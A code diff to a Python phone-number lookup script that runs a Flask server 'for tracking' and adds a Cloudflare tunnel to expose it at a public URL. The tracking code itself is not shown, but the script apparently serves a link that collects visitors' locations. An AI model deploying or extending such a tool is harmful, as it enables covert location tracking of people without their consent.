@@ -8,6 +8,10 @@ import webbrowser
 from geopy.geocoders import Nominatim
 from datetime import datetime
 import os
+import subprocess
+import threading
+import time
+
 
 # ========== Banner ==========
 def show_banner():
@@ -156,15 +160,45 @@ def show_phone_info():
         phone_number = sys.argv[1]
         result = phone_number_info(phone_number)
         print(result)
-        print("\n🔗 Visit the link to check location: http://localhost:5000")
+        print("\n🔗 Visit the link to check location: http://localhost")
         print("🚀 Starting local Flask server for tracking...\n")
+
+
+def start_cloudflare_tunnel():
+    try:
+        print("☁️  Starting Cloudflare Tunnel on port 5000...")
+        tunnel_process = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+
+        # Monitor output to extract and print the public URL
+        def monitor_output():
+            for line in tunnel_process.stdout:
+                print("🌐", line.strip())
+                if "https://" in line and "trycloudflare.com" in line:
+                    url = line.strip().split()[-1]
+                    print(f"\n🚀 Public URL: {url}\n")
+                    break
+
+        threading.Thread(target=monitor_output, daemon=True).start()
+        return tunnel_process
+
+    except FileNotFoundError:
+        print("❌ Error: 'cloudflared' not found. Install it from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
+        sys.exit(1)
 
 # ========== Main ==========
 def main():
     show_banner()
     show_phone_info()
-    webbrowser.open("http://localhost:80")
-    app.run(host='0.0.0.0', port=80)
+    start_cloudflare_tunnel()
+    time.sleep(5)  # Wait briefly to ensure tunnel starts
+    webbrowser.open("http://localhost:5000")
+    app.run(host='0.0.0.0', port=5000)
+
 
 # ========== Run ==========
 if __name__ == "__main__":
